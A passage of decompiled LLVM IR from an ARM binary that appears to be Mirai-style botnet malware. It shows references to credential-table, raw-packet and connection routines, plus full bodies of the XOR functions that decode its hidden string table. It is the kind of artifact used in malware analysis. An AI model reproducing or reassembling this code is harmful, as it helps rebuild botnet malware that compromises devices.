  uselistorder i32* %r3.global-to-local, { 74, 62, 63, 64, 65, 66, 67, 68, 69, 70, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 84, 86, 87, 41, 0, 1, 2, 42, 43, 44, 45, 46, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 17, 15, 16, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 107, 71, 72, 73, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 126, 125, 122, 127, 164, 165, 128, 129, 166, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 159, 158, 108, 160, 161, 162, 163, 104, 105, 106, 109, 110, 111, 112, 113 }
  uselistorder i32* %r2.global-to-local, { 53, 54, 37, 38, 39, 40, 41, 42, 43, 44, 45, 55, 56, 57, 58, 29, 46, 2, 3, 30, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 47, 48, 49, 50, 51, 52, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 94, 95, 98, 99, 101, 100, 97, 102, 103, 1, 105, 104, 0, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 96, 116, 117, 118, 119, 120, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %r1.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 102, 58, 59, 60, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 106, 36, 37, 38, 39, 40, 41, 90, 91, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 92, 93, 94, 95, 96, 97, 98, 99, 105, 100, 101, 103, 104, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 16, 14, 15, 17, 0, 18, 19, 20, 21, 22, 23, 13, 27, 24, 25, 26, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 149, 124, 159, 32, 111, 142, 143, 129, 130, 112, 113, 80, 81, 82, 83, 84, 0, 119, 2, 3, 5, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 23, 24, 25, 20, 21, 22, 26, 27, 28, 29, 30, 31, 241, 33, 38, 34, 35, 36, 37, 39, 40, 41, 42, 43, 47, 48, 49, 44, 45, 46, 50, 51, 52, 53, 54, 55, 59, 60, 61, 56, 57, 58, 62, 63, 64, 65, 66, 67, 71, 72, 73, 68, 69, 70, 74, 75, 76, 77, 78, 79, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 4, 102, 103, 104, 99, 100, 101, 105, 106, 107, 108, 109, 110, 114, 115, 116, 117, 118, 240, 120, 121, 122, 123, 131, 136, 135, 137, 139, 140, 141, 145, 146, 147, 148, 6, 7, 150, 151, 152, 153, 154, 160, 161, 162, 163, 164, 167, 169, 170, 168, 165, 166, 138, 134, 132, 171, 133, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 239, 210, 211, 238, 212, 213, 128, 214, 215, 216, 217, 218, 219, 127, 220, 221, 222, 223, 224, 126, 225, 226, 227, 125, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 155, 156, 157, 144, 158 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 145, 0, 156, 33, 109, 110, 126, 135, 137, 127, 111, 81, 82, 83, 84, 1, 234, 3, 5, 6, 14, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 24, 25, 26, 21, 22, 23, 27, 28, 29, 30, 31, 32, 233, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 48, 49, 50, 45, 46, 47, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 4, 100, 101, 102, 97, 98, 99, 103, 104, 105, 106, 107, 108, 112, 113, 114, 115, 116, 235, 117, 118, 119, 120, 129, 132, 131, 133, 136, 138, 139, 141, 142, 143, 144, 7, 8, 146, 147, 148, 149, 151, 157, 158, 159, 162, 164, 165, 163, 160, 161, 134, 130, 150, 166, 128, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 232, 203, 204, 125, 205, 206, 124, 207, 208, 209, 210, 211, 212, 123, 213, 214, 215, 216, 217, 122, 218, 219, 220, 121, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 152, 153, 154, 140, 155 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_22474.149, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_22474.149 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 50, 49, 37, 36, 35, 43, 48, 47, 46, 45, 44, 42, 41, 40, 39, 38, 34, 33, 2, 30, 29, 28, 32, 31, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 39, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42 }
  uselistorder i32 (i32)* @table_unlock_val, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 3, 22, 21, 20, 24, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 2, 0 }
  uselistorder i32 384, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 29, { 4, 3, 0, 1, 2 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19a8c.172 to i32), { 0, 2, 1, 3 }
  uselistorder i8* @global_var_22469.167, { 1, 0 }
  uselistorder i16* @global_var_2245e.166, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i32 5888, { 0, 2, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_2245c.161 to i32), { 2, 3, 1, 0, 4, 5 }
  uselistorder i8* @global_var_22468.162, { 1, 0 }
  uselistorder i8** @global_var_22448.158, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22448.158 to i32), { 0, 7, 1, 6, 2, 5, 4, 3 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 74, 71, 21, 20, 70, 69, 68, 72, 67, 66, 65, 73, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 2, 1, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_24f60.156, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24f5c.154, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_24f5c.154 to i32), { 1, 0, 2, 3, 4 }
  uselistorder i32 356, { 0, 5, 6, 7, 1, 8, 10, 2, 11, 12, 3, 4, 9 }
  uselistorder i32 388, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_22478.143, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24f40.59, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24f40.59 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_24f64.141, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10464, { 1, 0 }
  uselistorder label %dec_label_pc_f6c0.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f6c0.backedge.thread562, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f6c0.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10418, { 1, 0 }
  uselistorder label %dec_label_pc_10378, { 1, 0 }
  uselistorder label %dec_label_pc_1016c, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_10134, { 1, 0 }
  uselistorder label %dec_label_pc_10120, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10110, { 1, 0 }
  uselistorder label %dec_label_pc_10000, { 1, 0 }
  uselistorder label %dec_label_pc_ff34, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ff1c, { 1, 0 }
  uselistorder label %dec_label_pc_fe30, { 1, 0 }
  uselistorder label %dec_label_pc_fd74, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fd5c, { 1, 0 }
  uselistorder label %dec_label_pc_fc2c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fc14, { 1, 0 }
  uselistorder label %dec_label_pc_fb58, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb40, { 1, 0 }
  uselistorder label %dec_label_pc_facc, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa98, { 1, 0 }
  uselistorder label %.thread100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa78, { 1, 0 }
  uselistorder label %dec_label_pc_fa64, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_fa20, { 1, 0 }
  uselistorder label %dec_label_pc_fa20.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f9b4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f99c, { 1, 0 }
  uselistorder label %dec_label_pc_f910, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f908, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f8f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f7cc, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %bb420, { 1, 0 }
  uselistorder label %dec_label_pc_f794, { 1, 0 }
  uselistorder label %dec_label_pc_f728, { 1, 0 }
  uselistorder label %.thread83, { 1, 0 }
  uselistorder label %dec_label_pc_f6d8, { 1, 0 }
  uselistorder label %dec_label_pc_f6c8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f6c8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f6bc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f6a4, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %dec_label_pc_f5c4, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 1, 0 }
  uselistorder label %bb408, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f4b4.dec_label_pc_f4b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f490.dec_label_pc_f490_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f484, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f46c, { 1, 0 }
  uselistorder label %dec_label_pc_f448, { 1, 0 }
  uselistorder label %dec_label_pc_f2f0, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f2dc, { 1, 0 }
  uselistorder label %bb405, { 1, 0 }
  uselistorder label %dec_label_pc_f170, { 1, 0 }
  uselistorder label %dec_label_pc_f164, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
  uselistorder label %dec_label_pc_f14c, { 1, 0 }
  uselistorder label %dec_label_pc_f140, { 1, 0 }
  uselistorder label %dec_label_pc_f12c, { 1, 0 }
  uselistorder label %dec_label_pc_f118, { 1, 0 }
  uselistorder label %dec_label_pc_f104, { 1, 0 }
  uselistorder label %dec_label_pc_f0e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0c0, { 1, 0 }
  uselistorder label %dec_label_pc_f0b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f090, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f06c, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_f018, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ee1c, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24f6c.217 to i32), i32* @r2, align 4
  %v3_10470 = mul i32 %arg1, 8
  %v2_10474 = add i32 %v3_10470, ptrtoint (i32* @global_var_24f6c.217 to i32)
  store i32 %v2_10474, i32* @r3, align 4
  %v2_10478 = icmp eq i32* %arg2, null
  br i1 %v2_10478, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_104804 = inttoptr i32 %v2_10474 to i32*
  %v4_104805 = load i32, i32* %v3_104804, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_1047c = add i32 %v3_10470, add (i32 ptrtoint (i32* @global_var_24f6c.217 to i32), i32 4)
  %v3_1047c = inttoptr i32 %v2_1047c to i16*
  %v4_1047c = load i16, i16* %v3_1047c, align 4
  %v5_1047c = zext i16 %v4_1047c to i32
  store i32 %v5_1047c, i32* @r3, align 4
  %v3_10480 = inttoptr i32 %v2_10474 to i32*
  %v4_10480 = load i32, i32* %v3_10480, align 4
  store i32 %v5_1047c, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_104806 = phi i32 [ %v4_104805, %.thread ], [ %v4_10480, %bb ]
  ret i32 %v4_104806

; uselistorder directives
  uselistorder i32 %v2_10474, { 1, 0, 2 }
  uselistorder i32 %v3_10470, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10498 = mul i32 %arg1, 8
  %v2_1049c = add i32 %v3_10498, ptrtoint (i32* @global_var_24f6c.217 to i32)
  %v2_104a0 = load i32, i32* @global_var_222bc.220, align 4
  store i32 %v2_104a0, i32* @r1, align 4
  %v1_104a4 = add i32 %v3_10498, add (i32 ptrtoint (i32* @global_var_24f6c.217 to i32), i32 4)
  %v2_104a4 = inttoptr i32 %v1_104a4 to i16*
  %v3_104a4 = load i16, i16* %v2_104a4, align 4
  %v3_104a8 = udiv i32 %v2_104a0, 256
  %v2_104ac = icmp eq i16 %v3_104a4, 0
  %v3_104b0 = udiv i32 %v2_104a0, 65536
  store i32 %v3_104b0, i32* @r3, align 4
  %v3_104b4 = load i32, i32* @r4, align 4
  store i32 %v3_104b4, i32* %stack_var_-16, align 4
  %v1_104b8 = urem i32 %v3_104a8, 256
  store i32 %v1_104b8, i32* %r6.global-to-local, align 4
  %v1_104bc = urem i32 %v3_104b0, 256
  store i32 %v1_104bc, i32* %r5.global-to-local, align 4
  %v3_104c0 = udiv i32 %v2_104a0, 16777216
  store i32 %v3_104c0, i32* %r4.global-to-local, align 4
  %v1_104c4 = urem i32 %v2_104a0, 256
  store i32 %v1_104c4, i32* %lr.global-to-local, align 4
  br i1 %v2_104ac, label %dec_label_pc_10520, label %dec_label_pc_104cc

dec_label_pc_104cc:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_104d0 = inttoptr i32 %v2_1049c to i32*
  br label %dec_label_pc_104d0

dec_label_pc_104d0:                               ; preds = %dec_label_pc_104d0.dec_label_pc_104d0_crit_edge, %dec_label_pc_104cc
  %v0_104d8 = phi i32 [ %v0_104d8.pre, %dec_label_pc_104d0.dec_label_pc_104d0_crit_edge ], [ %v1_104c4, %dec_label_pc_104cc ]
  %v2_104dc = phi i32 [ %v1_10514, %dec_label_pc_104d0.dec_label_pc_104d0_crit_edge ], [ 0, %dec_label_pc_104cc ]
  %v2_104d0 = load i32, i32* %v1_104d0, align 4
  %v2_104d4 = add i32 %v2_104d0, %v2_104dc
  %v3_104d4 = inttoptr i32 %v2_104d4 to i8*
  %v4_104d4 = load i8, i8* %v3_104d4, align 1
  %v6_104d4 = zext i8 %v4_104d4 to i32
  %v2_104d8 = xor i32 %v6_104d4, %v0_104d8
  %v1_104dc = trunc i32 %v2_104d8 to i8
  store i8 %v1_104dc, i8* %v3_104d4, align 1
  %v2_104e0 = load i32, i32* %v1_104d0, align 4
  %v0_104e4 = load i32, i32* @ip, align 4
  %v2_104e4 = add i32 %v0_104e4, %v2_104e0
  %v3_104e4 = inttoptr i32 %v2_104e4 to i8*
  %v4_104e4 = load i8, i8* %v3_104e4, align 1
  %v6_104e4 = zext i8 %v4_104e4 to i32
  %v0_104e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_104e8 = xor i32 %v0_104e8, %v6_104e4
  %v1_104ec = trunc i32 %v2_104e8 to i8
  store i8 %v1_104ec, i8* %v3_104e4, align 1
  %v2_104f0 = load i32, i32* %v1_104d0, align 4
  %v0_104f4 = load i32, i32* @ip, align 4
  %v2_104f4 = add i32 %v0_104f4, %v2_104f0
  %v3_104f4 = inttoptr i32 %v2_104f4 to i8*
  %v4_104f4 = load i8, i8* %v3_104f4, align 1
  %v6_104f4 = zext i8 %v4_104f4 to i32
  %v0_104f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_104f8 = xor i32 %v0_104f8, %v6_104f4
  %v1_104fc = trunc i32 %v2_104f8 to i8
  store i8 %v1_104fc, i8* %v3_104f4, align 1
  %v2_10500 = load i32, i32* %v1_104d0, align 4
  store i32 %v2_10500, i32* @r1, align 4
  %v0_10504 = load i32, i32* @ip, align 4
  %v2_10504 = add i32 %v0_10504, %v2_10500
  %v3_10504 = inttoptr i32 %v2_10504 to i8*
  %v4_10504 = load i8, i8* %v3_10504, align 1
  %v6_10504 = zext i8 %v4_10504 to i32
  %v0_10508 = load i32, i32* %r4.global-to-local, align 4
  %v2_10508 = xor i32 %v0_10508, %v6_10504
  store i32 %v2_10508, i32* @r3, align 4
  %v1_1050c = trunc i32 %v2_10508 to i8
  store i8 %v1_1050c, i8* %v3_10504, align 1
  %v3_10510 = load i16, i16* %v2_104a4, align 4
  %v4_10510 = zext i16 %v3_10510 to i32
  %v0_10514 = load i32, i32* @ip, align 4
  %v1_10514 = add i32 %v0_10514, 1
  store i32 %v1_10514, i32* @ip, align 4
  %v8_1051c = icmp sgt i32 %v4_10510, %v1_10514
  br i1 %v8_1051c, label %dec_label_pc_104d0.dec_label_pc_104d0_crit_edge, label %dec_label_pc_10520.loopexit

dec_label_pc_104d0.dec_label_pc_104d0_crit_edge:  ; preds = %dec_label_pc_104d0
  %v0_104d8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_104d0

dec_label_pc_10520.loopexit:                      ; preds = %dec_label_pc_104d0
  %v2_10520.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10520

dec_label_pc_10520:                               ; preds = %dec_label_pc_10520.loopexit, %entry
  %v2_10520 = phi i32 [ %v2_10520.pre, %dec_label_pc_10520.loopexit ], [ %v3_104b4, %entry ]
  store i32 %v2_10520, i32* @r4, align 4
  ret i32 %v2_1049c

; uselistorder directives
  uselistorder i32 %v1_10514, { 1, 2, 0 }
  uselistorder i32 %v1_104c4, { 1, 0 }
  uselistorder i32 %v3_104b0, { 1, 0 }
  uselistorder i32 %v2_104a0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10498, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10538 = mul i32 %arg1, 8
  %v2_1053c = add i32 %v3_10538, ptrtoint (i32* @global_var_24f6c.217 to i32)
  %v2_10540 = load i32, i32* @global_var_222bc.220, align 4
  %v1_10544 = add i32 %v3_10538, add (i32 ptrtoint (i32* @global_var_24f6c.217 to i32), i32 4)
  %v2_10544 = inttoptr i32 %v1_10544 to i16*
  %v3_10544 = load i16, i16* %v2_10544, align 4
  %v3_10548 = udiv i32 %v2_10540, 256
  %v2_1054c = icmp eq i16 %v3_10544, 0
  %v3_10550 = udiv i32 %v2_10540, 65536
  %v3_10554 = load i32, i32* @r4, align 4
  store i32 %v3_10554, i32* %stack_var_-16, align 4
  %v1_10558 = urem i32 %v3_10548, 256
  store i32 %v1_10558, i32* %r6.global-to-local, align 4
  %v1_1055c = urem i32 %v3_10550, 256
  store i32 %v1_1055c, i32* %r5.global-to-local, align 4
  %v3_10560 = udiv i32 %v2_10540, 16777216
  store i32 %v3_10560, i32* %r4.global-to-local, align 4
  %v1_10564 = urem i32 %v2_10540, 256
  store i32 %v1_10564, i32* %lr.global-to-local, align 4
  br i1 %v2_1054c, label %dec_label_pc_105c0, label %dec_label_pc_1056c

dec_label_pc_1056c:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10570 = inttoptr i32 %v2_1053c to i32*
  br label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %dec_label_pc_10570.dec_label_pc_10570_crit_edge, %dec_label_pc_1056c
  %v0_10578 = phi i32 [ %v0_10578.pre, %dec_label_pc_10570.dec_label_pc_10570_crit_edge ], [ %v1_10564, %dec_label_pc_1056c ]
  %v2_1057c = phi i32 [ %v1_105b4, %dec_label_pc_10570.dec_label_pc_10570_crit_edge ], [ 0, %dec_label_pc_1056c ]
  %v2_10570 = load i32, i32* %v1_10570, align 4
  %v2_10574 = add i32 %v2_10570, %v2_1057c
  %v3_10574 = inttoptr i32 %v2_10574 to i8*
  %v4_10574 = load i8, i8* %v3_10574, align 1
  %v6_10574 = zext i8 %v4_10574 to i32
  %v2_10578 = xor i32 %v6_10574, %v0_10578
  %v1_1057c = trunc i32 %v2_10578 to i8
  store i8 %v1_1057c, i8* %v3_10574, align 1
  %v2_10580 = load i32, i32* %v1_10570, align 4
  %v0_10584 = load i32, i32* @ip, align 4
  %v2_10584 = add i32 %v0_10584, %v2_10580
  %v3_10584 = inttoptr i32 %v2_10584 to i8*
  %v4_10584 = load i8, i8* %v3_10584, align 1
  %v6_10584 = zext i8 %v4_10584 to i32
  %v0_10588 = load i32, i32* %r6.global-to-local, align 4
  %v2_10588 = xor i32 %v0_10588, %v6_10584
  %v1_1058c = trunc i32 %v2_10588 to i8
  store i8 %v1_1058c, i8* %v3_10584, align 1
  %v2_10590 = load i32, i32* %v1_10570, align 4
  %v0_10594 = load i32, i32* @ip, align 4
  %v2_10594 = add i32 %v0_10594, %v2_10590
  %v3_10594 = inttoptr i32 %v2_10594 to i8*
  %v4_10594 = load i8, i8* %v3_10594, align 1
  %v6_10594 = zext i8 %v4_10594 to i32
  %v0_10598 = load i32, i32* %r5.global-to-local, align 4
  %v2_10598 = xor i32 %v0_10598, %v6_10594
  %v1_1059c = trunc i32 %v2_10598 to i8
  store i8 %v1_1059c, i8* %v3_10594, align 1
  %v2_105a0 = load i32, i32* %v1_10570, align 4
  %v0_105a4 = load i32, i32* @ip, align 4
  %v2_105a4 = add i32 %v0_105a4, %v2_105a0
  %v3_105a4 = inttoptr i32 %v2_105a4 to i8*
  %v4_105a4 = load i8, i8* %v3_105a4, align 1
  %v6_105a4 = zext i8 %v4_105a4 to i32
  %v0_105a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_105a8 = xor i32 %v0_105a8, %v6_105a4
  %v1_105ac = trunc i32 %v2_105a8 to i8
  store i8 %v1_105ac, i8* %v3_105a4, align 1
  %v3_105b0 = load i16, i16* %v2_10544, align 4
  %v4_105b0 = zext i16 %v3_105b0 to i32
  %v0_105b4 = load i32, i32* @ip, align 4
  %v1_105b4 = add i32 %v0_105b4, 1
